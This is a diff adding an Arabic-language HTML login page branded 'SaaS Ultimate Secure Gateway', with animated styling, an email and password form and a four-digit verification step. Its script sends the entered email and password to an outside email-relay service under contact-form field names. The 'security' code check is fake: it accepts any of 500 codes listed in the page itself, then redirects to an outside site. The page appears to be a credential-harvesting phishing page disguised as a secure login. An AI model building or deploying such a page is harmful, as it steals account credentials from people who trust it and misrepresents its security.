@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SaaS Ultimate Secure Gateway</title>
+    <style>
+        :root {
+            --primary: #0ef;
+            --bg: #111a28;
+            --sec: #2c4766;
+            --transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: var(--bg);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        /* Kinetic Background Engine */
+        #bg-engine {
+            position: absolute;
+            width: 500px;
+            height: 500px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: var(--transition);
+        }
+
+        #bg-engine span {
+            position: absolute;
+            left: 0;
+            width: 32px;
+            height: 6px;
+            background: var(--sec);
+            border-radius: 80px;
+            transform-origin: 250px;
+            transform: rotate(calc(var(--i) * (360deg / 50)));
+            animation: blink 3s linear infinite;
+            animation-delay: calc(var(--i) * (3s / 50));
+        }
+
+        @keyframes blink {
+            0% { background: var(--primary); box-shadow: 0 0 15px var(--primary); }
+            25% { background: var(--sec); box-shadow: none; }
+        }
+
+        /* State: Blur Effect */
+        .blur-effect {
+            filter: blur(25px) brightness(0.3);
+            transform: scale(0.85) !important;
+            pointer-events: none;
+        }
+
+        /* UI Cards */
+        .auth-card {
+            position: absolute;
+            z-index: 10;
+            transition: var(--transition);
+        }
+
+        #login-step { width: 320px; opacity: 1; }
+
+        #verify-step {
+            position: fixed;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%) scale(0.6);
+            width: 450px; /* الحجم الأكبر المطلوب */
+            padding: 45px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 2px solid var(--primary);
+            border-radius: 30px;
+            backdrop-filter: blur(20px);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            opacity: 0;
+            visibility: hidden;
+            text-align: center;
+        }
+
+        #verify-step.show {
+            opacity: 1;
+            visibility: visible;
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        /* Form Inputs */
+        .input-box { position: relative; margin: 30px 0; }
+        
+        input {
+            width: 100%; height: 50px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid var(--sec);
+            border-radius: 40px;
+            outline: none; color: #fff;
+            padding: 0 20px; box-sizing: border-box;
+            transition: 0.4s;
+        }
+
+        input:focus { border-color: var(--primary); box-shadow: 0 0 15px rgba(0,238,255,0.2); }
+
+        label {
+            position: absolute; top: 50%; left: 20px;
+            transform: translateY(-50%); color: rgba(255,255,255,0.5);
+            transition: 0.4s; pointer-events: none;
+        }
+
+        input:focus ~ label, input:valid ~ label {
+            top: -12px; font-size: 0.85em; color: var(--primary);
+            background: var(--bg); padding: 0 8px;
+        }
+
+        .btn {
+            width: 100%; height: 55px; background: var(--primary);
+            border: none; border-radius: 40px; font-weight: 800;
+            color: #111; cursor: pointer; transition: 0.3s;
+            font-size: 1.1em;
+        }
+
+        /* 2FA OTP Inputs */
+        .otp-container { display: flex; justify-content: center; gap: 15px; margin: 35px 0; }
+        
+        .otp-container input {
+            width: 75px; height: 75px; /* مربعات كبيرة مريحة للعين */
+            border-radius: 15px; font-size: 2.2em;
+            text-align: center; background: rgba(255,255,255,0.1);
+            border: 2px solid var(--sec);
+        }
+
+        .otp-container input:focus { border-color: var(--primary); background: rgba(0,238,255,0.05); }
+
+        /* Notifications */
+        #toast {
+            position: fixed; top: 20px; right: 20px;
+            background: var(--primary); color: #000;
+            padding: 12px 25px; border-radius: 10px;
+            font-weight: bold; transform: translateX(200%);
+            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 10000;
+        }
+        #toast.active { transform: translateX(0); }
+    </style>
+</head>
+<body>
+
+    <div id="toast">تم الإرسال بنجاح</div>
+
+    <div id="bg-engine"></div>
+
+    <div id="login-step" class="auth-card">
+        <h2 style="color: var(--primary); text-align:center;">تسجيل الدخول</h2>
+        <form id="contact-form">
+            <div class="input-box">
+                <input type="email" name="name" required>
+                <label>البريد الإلكتروني</label>
+            </div>
+            <div class="input-box">
+                <input type="password" name="message" required>
+                <label>كلمة المرور</label>
+            </div>
+            <button class="btn" type="submit">إرسال الطلب</button>
+        </form>
+    </div>
+
+    <div id="verify-step" class="auth-card">
+        <h2 style="color: var(--primary); margin:0;">تحقق الأمان</h2>
+        <p style="color: #fff; opacity: 0.8; margin: 15px 0 30px;">أدخل الرمز المكون من 4 أرقام الذي استلمته يدوياً</p>
+        
+        <div class="otp-container" id="otp-inputs">
+            <input type="text" inputmode="numeric" maxlength="1" onkeypress="return /[0-9]/i.test(event.key)">
+            <input type="text" inputmode="numeric" maxlength="1" onkeypress="return /[0-9]/i.test(event.key)">
+            <input type="text" inputmode="numeric" maxlength="1" onkeypress="return /[0-9]/i.test(event.key)">
+            <input type="text" inputmode="numeric" maxlength="1" onkeypress="return /[0-9]/i.test(event.key)">
+        </div>
+
+        <button class="btn" id="verify-btn">تأكيد الرمز</button>
+        <p style="margin-top: 25px; color: #ff4d4d; cursor: pointer; font-size: 0.9em;" onclick="location.reload()">إلغاء وإعادة المحاولة</p>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+        // --- الهندسة المنطقية: الـ 500 كود المسبق ---
+        // تبدأ من 1001 وتنتهي بـ 1500
+        const VALID_TOKENS = Array.from({length: 500}, (_, i) => (1001 + i).toString());
+
+        // توليد محرك الخلفية (Kinetic Nodes)
+        const engine = document.getElementById('bg-engine');
+        for (let i = 0; i < 50; i++) {
+            const s = document.createElement('span'); 
+            s.style.setProperty('--i', i);
+            engine.appendChild(s);
+        }
+
+        function showToast(text) {
+            const t = document.getElementById('toast');
+            t.innerText = text; t.classList.add('active');
+            setTimeout(() => t.classList.remove('active'), 3500);
+        }
+
+        // إرسال البيانات والتحول البصري الفوري
+        (function() {
+            emailjs.init("MopIMvPNNyn21wo6Q");
+            document.getElementById("contact-form").addEventListener("submit", function(e) {
+                e.preventDefault();
+                
+                // إرسال البيانات في الخلفية بدون انتظار
+                emailjs.sendForm("service_aefy3u7", "template_wa7wq0t", this);
+                
+                showToast("تم استلام طلبك.. بانتظار الرمز");
+
+                // تنفيذ الـ Context Switch (Blur + Modal)
+                document.getElementById('login-step').classList.add('blur-effect');
+                document.getElementById('bg-engine').classList.add('blur-effect');
+                
+                setTimeout(() => {
+                    document.getElementById('verify-step').classList.add('show');
+                }, 300); // تأخير بسيط لجمالية الحركة
+            });
+        })();
+
+        // منطق الـ OTP (التنقل التلقائي والأرقام فقط)
+        const inputs = document.querySelectorAll('#otp-inputs input');
+        inputs.forEach((input, i) => {
+            input.addEventListener('input', () => {
+                if (input.value && i < inputs.length - 1) inputs[i+1].focus();
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && i > 0) inputs[i-1].focus();
+            });
+        });
+
+        // التحقق من قائمة الـ 500
+        document.getElementById('verify-btn').addEventListener('click', () => {
+            let code = "";
+            inputs.forEach(input => code += input.value);
+
+            if (VALID_TOKENS.includes(code)) {
+                showToast("تم التحقق بنجاح! جاري التوجيه..");
+                setTimeout(() => {
+                    window.location.href = "https://mahalmoh779-cpu.github.io/mahalmoh779-cpuw/"; // رابط موقعك النهائي
+                }, 2000);
+            } else {
+                showToast("الرمز غير صحيح!");
+                inputs.forEach(input => input.value = '');
+                inputs[0].focus();
+            }
+        });
+    </script>
+</body>
+</html>
